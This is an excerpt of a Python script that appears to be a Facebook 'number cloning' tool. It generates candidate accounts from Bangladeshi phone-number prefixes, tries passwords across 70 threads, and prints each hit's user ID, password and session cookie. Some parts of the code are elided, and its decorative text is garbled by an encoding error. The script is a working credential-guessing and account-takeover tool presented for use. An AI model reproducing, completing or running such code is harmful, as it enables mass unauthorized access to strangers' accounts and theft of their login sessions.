...
from os import system as _RAKIB_
try:
    import requests
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            print('')
def lo(word):
    RAKIB = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    for i in range(5):
        for x in range(len(RAKIB)):
            sys.stdout.write(('\r{}{}').format(str(word), RAKIB[x]))
            time.sleep(0.1)
            sys.stdout.flush()
...
def xxr():
    ...
    _SHAKIB_("clear")
    SHAKIB(logo)
    print("\033[1;97m [01] ð™‰ð™ð™ˆð˜½ð™€ð™ ð˜¾ð™‡ð™Šð™‰ð™„ð™‰ð™‚")
    print("\033[1;97m [02] ð˜¾ð™Šð™‰ð™ð˜¼ð˜¾ð™ ð™’ð™„ð™ð™ƒ ð™ˆð™€ ð™„ð™‰ ð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™†")
    print("\033[1;97m [03] ð™ð™Šð™‡ð™‡ð™Šð™’ ð™ˆð™” ð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™† ð™‚ð™ð™ð™‹ð™€")
    print("\033[1;97m [04] ð™ð™Šð™‡ð™‡ð™Šð™’ ð™ˆð™” ð™‚ð™„ð™ð™ƒð™ð˜½ ð˜¼ð˜¾ð˜¾ð™Šð™ð™‰ð™")
    print("\033[1;97m [00] ð™€ð™“ð™„ð™")
    print("\n\033[1;97mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    shakibhk = input(f' \033[1;97mð—–ð—›ð—¢ð—¢ð—¦ð—˜ : ')
    if shakibhk in ["1","01"]:
    	print("")
    if shakibhk in ["2","02"]:
      _SHAKIB_('xdg-open https://www.facebook.com/profile.php?id=100076836152171')
    if shakibhk in ["3","03"]:
    	_SHAKIB_('xdg-open https://facebook.com/groups/814354150210238/')
    if shakibhk in ["4","04"]:
    ...
    _SHAKIB_("clear")
    SHAKIB(logo)
    SHAKIB(f' \033[1;97m ð—˜ð—«ð—”ð— ð—£ð—Ÿð—˜ : 019,017,018,92302,92301,917781')
    SHAKIB("  \033[1;97mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;97m ð—–ð—›ð—¢ð—¢ð—¦ð—˜ : ')
    _SHAKIB_('clear')
    print(logo)
    limit = int(input(f' \033[1;97m ð—˜ð—«ð—”ð— ð—£ð—Ÿð—˜ : 5000, 20000, 50000 \n \033[1;97mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\033[1;97m  ð—£ð—¨ð—§ ð—–ð—Ÿð—¢ð—¡ð—œð—¡ð—š ð—Ÿð—œð— ð—œð—§ : '))
    ...
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print(' \033[1;97m[â€¢] ð—§ð—¢ð—§ð—”ð—Ÿ ð—œð—— ð—Ÿð—œð— ð—œð—§  '+tl)
        print(f" \033[1;97m[â€¢] ð—¬ð—¢ð—¨ ð—–ð—›ð—¢ð—¢ð—¦ð—˜ ð—¡ð—¨ð— ð—•ð—˜ð—¥ ð—–ð—Ÿð—¢ð—¡ð—œð—¡ð—š ")
        print(f" \033[1;97m[â€¢] ð—–ð—Ÿð—¢ð—¡ð—˜ ð—¦ð—§ð—”ð—¥ð—§ð—œð—¡ð—š ð—§ð—œð— ð—˜ {dt_string}")
        print(f' \033[1;97m[â€¢] ð—ªð—”ð—œð—§ ð— ð—¢ð—§ð—›ð—˜ð—¥ ð—§ð—¢ð—¦ð—§ ')
        print(f" \033[1;97m[â€¢] ð—¦ð—§ð—¢ð—£ ð—£ð—¥ð—¢ð—¦ð—¦ð—˜ð—¦ ð—£ð—¥ð—˜ð—¦ð—¦ ð—–ð—§ð—¥ð—Ÿ + ð—­")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"""\r\033[1;92m [ð˜¿ð˜¼ð™ð™†-ð™Šð™†] {uid} | {ps}\n ð˜¾ð™Šð™Šð™†ð™„ð™€ : {coki}\n""")
                import os
        ...
        emoji=random.choice(['ðŸ˜†','ðŸ¸','ðŸ™ƒ','ðŸ˜ˆ','ðŸ–•','ðŸ¦…','ðŸ¦‰','ðŸŽ','ðŸ','ðŸ¦Ÿ','ðŸ§','ðŸ˜','ðŸ™‚','ðŸ¤','â™¥ï¸','ðŸ˜˜','ðŸ˜»','ðŸ˜','ðŸ˜¹','ðŸ¤£','ðŸ˜‚','ðŸ˜­','ðŸ˜','ðŸ˜œ','ðŸ¤«','ðŸ˜¶','ðŸ¥±','ðŸ˜¤','ðŸ¥µ','ðŸ˜‡','ðŸ’‹','ðŸ™ˆ','ðŸ™€','ðŸ’š','ðŸ’›','ðŸ–¤','ðŸ¤Ž','ðŸ’™','ðŸ’œ','ðŸ¦¶','??','ðŸŒº','ðŸŒ¸','ðŸµï¸','ðŸ','ðŸŒ¼','??','ðŸ','ðŸ¦¡','âœˆï¸','ðŸ¦›','ðŸ¦','ðŸ‡','ðŸ®','ðŸ°','ðŸ¦ƒ','ðŸ•¸ï¸','ðŸ¦‹','ðŸ’','ðŸ“','ðŸ‘','ðŸŠ','ðŸ¥­','ðŸ','ðŸŒ','ðŸŒ¶ï¸','ðŸ¥¥','ðŸ›','ðŸ¥•','ðŸ—','ðŸ†','ðŸ¥','ðŸ§€','ðŸ¤','ðŸ‡§ðŸ‡©','â˜ ï¸'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}ð——ð—”ð—¥ð—ž\33[1;90m]{colo}âœ˜\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[1;97mð——ð—”ð—¥ð—ž{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()
